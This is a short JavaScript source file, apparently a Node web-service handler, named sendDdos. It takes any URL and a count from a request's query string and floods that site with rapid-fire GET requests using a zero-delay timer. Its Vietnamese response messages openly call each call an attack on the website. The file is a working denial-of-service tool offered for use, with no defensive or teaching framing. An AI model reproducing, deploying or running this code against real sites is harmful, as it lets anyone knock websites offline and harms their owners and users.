import axios from "axios";
function Ddos(link, max) {
  let failed = 0;
  let count = 0;
  const inter = setInterval(() => {
    count++;
    axios.get(link).catch(() => {
      failed++;
    })
    if (count > max) {
      clearInterval(inter);
    }
  }, 0);
}
function isValidURL(str) {
  const urlPattern =
    /^(https?:\/\/)?([\w-]+(\.[\w-]+)+)([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?$/;
  return urlPattern.test(str);
}
export const sendDdos = async (req, res) => {
  if (isNaN(req.query.max)) {
    return res.json({
      code: 400,
      message: "Số lần tấn công phải là số",
    });
  }
  if (isValidURL(req.query.link)) {
    Ddos(req.query.link, req.query.max);
  } else {
    return res.json({
      code: 400,
      message: "Link sai định dạng",
    });
  }
  res.json({
    code:200,
    message: `Đã gửi request tấn công website: ${req.query.link}`
  })
};
